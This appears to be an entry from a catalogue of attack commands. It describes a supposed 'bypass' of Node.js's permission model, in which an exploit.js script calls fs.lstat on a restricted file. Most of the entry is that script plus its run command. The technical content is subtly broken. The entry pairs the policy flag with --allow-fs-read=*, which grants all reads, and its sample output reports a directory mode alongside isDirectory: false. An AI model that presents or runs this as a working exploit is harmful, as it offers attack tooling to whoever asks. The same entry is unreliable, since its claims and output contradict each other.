---
id: cmd-node-fs-lstat-bypass
data: |-
  cat > exploit.js << EOF
  import fs from 'fs/promises';

  async function statFile(path) {
    try {
      const stats = await fs.lstat(path);
      console.log('File stats retrieved:', {
        size: stats.size,
        mode: stats.mode,
        mtime: stats.mtime,
        isDirectory: stats.isDirectory()
      });
    } catch (err) {
      console.error('Error:', err.message);
    }
  }

  statFile('/tmp/restricted.txt');
  EOF

  node --experimental-policy=policy.json --allow-fs-read=* exploit.js
tags:
  - nodejs
  - exploit
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Node.js
created_at: '2023-09-12T00:00:00Z'
updated_at: '2025-12-14T17:29:28.392Z'
verified: false
validated: true
submitted: true
---
# node-fs-lstat-bypass

## Command

```bash
cat > exploit.js << EOF
import fs from 'fs/promises';

async function statFile(path) {
  try {
    const stats = await fs.lstat(path);
    console.log('File stats retrieved:', {
      size: stats.size,
      mode: stats.mode,
      mtime: stats.mtime,
      isDirectory: stats.isDirectory()
    });
  } catch (err) {
    console.error('Error:', err.message);
  }
}

statFile('/tmp/restricted.txt');
EOF

node --experimental-policy=policy.json --allow-fs-read=* exploit.js
```

## Description

This command creates and executes a Node.js script that uses fs.lstat to retrieve metadata from a restricted file, bypassing the experimental permission model's restrictions when --allow-fs-read is enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cat > exploit.js` | Creates the JavaScript exploit file | Yes |
| `node --experimental-policy=policy.json` | Enables the permission model with the policy file | Yes |
| `--allow-fs-read=*` | Permits fs-read operations, triggering the vuln | Yes |
| `exploit.js` | The script file to execute | Yes |
| `/tmp/restricted.txt` | Path to a file without read permission (adjust as needed) | Yes |

## Examples

### Basic Usage

```bash
cat > exploit.js << EOF
import fs from 'fs/promises';

async function statFile(path) {
  try {
    const stats = await fs.lstat(path);
    console.log('File stats retrieved:', stats);
  } catch (err) {
    console.error('Error:', err.message);
  }
}

statFile('/tmp/restricted.txt');
EOF

node --experimental-policy=policy.json --allow-fs-read=* exploit.js
```

### Advanced Usage

To target multiple files:

```bash
# Modify script to loop over paths
node --experimental-policy=policy.json --allow-fs-read=* exploit.js
```

## Expected Output

File stats retrieved: { size: 0, mode: 16877, mtime: 2023-09-12T10:00:00.000Z, isDirectory: false } (example; actual stats vary by file).

## Related

- [[Related Procedure]]
